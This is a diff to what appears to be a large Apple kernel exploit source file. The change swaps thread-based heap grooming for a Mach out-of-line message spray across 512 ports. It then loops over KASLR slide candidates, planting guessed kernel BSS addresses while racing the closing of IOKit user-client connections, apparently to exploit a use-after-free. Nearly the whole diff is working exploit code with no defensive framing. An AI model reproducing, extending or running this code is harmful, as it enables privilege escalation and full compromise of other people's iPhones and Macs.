@@ -24731,21 +24731,35 @@ new_modes:
                 int r204_survived = 0;
                 int r204_tested = 0;
 
+                #define R204_OOL_SPRAY_N 512
+                mach_port_t r204_ool_ports[R204_OOL_SPRAY_N];
+                for (int i = 0; i < R204_OOL_SPRAY_N; i++) {
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &r204_ool_ports[i]);
+                    mach_port_insert_right(mach_task_self(), r204_ool_ports[i],
+                        r204_ool_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+                }
+
+                typedef struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } r204_ool_msg_t;
+
+                typedef struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } r204_ool_recv_t;
+
                 for (int ci = r204_start; ci < r204_end; ci++) {
                     uint64_t cand = R203_SLIDE_MIN + (uint64_t)ci * R203_SLIDE_STEP;
                     uint64_t bss_raw = R198_KC_BASE + cand + BSS_MID_DEFAULT;
-                    /* Kernel __DATA pages use MTE tag 0x0; keep canonical addr */
                     uint64_t bss_probe = bss_raw;
 
-                    uint64_t r204_scan_data[4] = {bss_probe, 0, 0, 0};
-                    p16_groom_data = r204_scan_data;
-
-                    p16_groom_count = 0;
-                    p16_groom_run = 1;
-                    pthread_t r204_gths[4];
-                    for (int t = 0; t < 4; t++)
-                        pthread_create(&r204_gths[t], NULL, p16_groom_spray, NULL);
-                    usleep(1000);
+                    uint8_t ool_data[32];
+                    memset(ool_data, 0, 32);
+                    *(uint64_t *)&ool_data[0] = bss_probe;
 
                     uint64_t r204_inp[3] = {1, 2, 3};
                     io_connect_t r204_pcs[8]; int r204_phave[8];
@@ -24764,35 +24778,43 @@ new_modes:
                         } else r204_pcs[i] = IO_OBJECT_NULL;
                     }
 
-                    p13_spam_run = 1;
-                    p13_spam_conn = r204_phave[0] ? r204_pcs[0] : IO_OBJECT_NULL;
-                    p13_spam_shape = 1;
-                    p13_spam_count = 0;
-                    pthread_t r204_spam[16];
-                    for (int t = 0; t < 16; t++)
-                        pthread_create(&r204_spam[t], NULL, p13_spam_reg, NULL);
-
                     for (int i = 7; i >= 0; i--) {
                         if (r204_phave[i]) { IOServiceClose(r204_pcs[i]); r204_phave[i] = 0; }
-                        usleep(100);
+                        usleep(50);
                     }
-                    p13_spam_run = 0;
-                    for (int t = 0; t < 16; t++) pthread_join(r204_spam[t], NULL);
                     for (int i = 0; i < 8; i++) if (r204_phave[i]) IOServiceClose(r204_pcs[i]);
-                    usleep(2000);
-                    p16_groom_run = 0;
-                    for (int t = 0; t < 4; t++) pthread_join(r204_gths[t], NULL);
 
-                    rlog("  BSCAN [%d] slide=0x%llx probe=0x%016llx groom=%llu ",
+                    r204_ool_msg_t ool_msg;
+                    memset(&ool_msg, 0, sizeof(ool_msg));
+                    ool_msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX |
+                        MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+                    ool_msg.hdr.msgh_size = sizeof(ool_msg);
+                    ool_msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                    ool_msg.hdr.msgh_id = 0x204;
+                    ool_msg.body.msgh_descriptor_count = 1;
+                    ool_msg.ool.address = ool_data;
+                    ool_msg.ool.size = 32;
+                    ool_msg.ool.deallocate = FALSE;
+                    ool_msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+                    ool_msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                    int ool_sent = 0;
+                    for (int i = 0; i < R204_OOL_SPRAY_N; i++) {
+                        ool_msg.hdr.msgh_remote_port = r204_ool_ports[i];
+                        kern_return_t kr = mach_msg(&ool_msg.hdr, MACH_SEND_MSG,
+                            sizeof(ool_msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                        if (kr == KERN_SUCCESS) ool_sent++;
+                    }
+
+                    rlog("  BSCAN [%d] slide=0x%llx probe=0x%016llx ool=%d ",
                          ci, (unsigned long long)cand,
-                         (unsigned long long)bss_probe,
-                         (unsigned long long)p16_groom_count);
+                         (unsigned long long)bss_probe, ool_sent);
 
                     p13_render_run = 1;
                     p13_render_frames = 0;
                     pthread_t r204_pr;
                     pthread_create(&r204_pr, NULL, p13_render_loop, NULL);
-                    usleep(200000);
+                    usleep(500000);
                     p13_render_run = 0;
                     pthread_join(r204_pr, NULL);
 
@@ -24800,7 +24822,16 @@ new_modes:
                     r204_survived++;
                     r204_tested++;
 
-                    usleep(50000);
+                    r204_ool_recv_t recv_msg;
+                    for (int i = 0; i < R204_OOL_SPRAY_N; i++) {
+                        memset(&recv_msg, 0, sizeof(recv_msg));
+                        recv_msg.hdr.msgh_size = sizeof(recv_msg);
+                        recv_msg.hdr.msgh_local_port = r204_ool_ports[i];
+                        mach_msg(&recv_msg.hdr, MACH_RCV_MSG, 0, sizeof(recv_msg),
+                            r204_ool_ports[i], 0, MACH_PORT_NULL);
+                    }
+
+                    usleep(10000);
                 }
 
                 rlog("\n  BATCH_DONE start=%d end=%d tested=%d survived=%d\n",
@@ -24809,6 +24840,12 @@ new_modes:
                 for (int g = 0; g < r204_gn; g++) {
                     IOServiceClose(r204_gconns[g]);
                     mach_port_deallocate(mach_task_self(), r204_gwps[g]);
+                }
+                for (int i = 0; i < R204_OOL_SPRAY_N; i++) {
+                    mach_port_mod_refs(mach_task_self(), r204_ool_ports[i],
+                        MACH_PORT_RIGHT_SEND, -1);
+                    mach_port_mod_refs(mach_task_self(), r204_ool_ports[i],
+                        MACH_PORT_RIGHT_RECEIVE, -1);
                 }
                 IOObjectRelease(r204_svc);
 
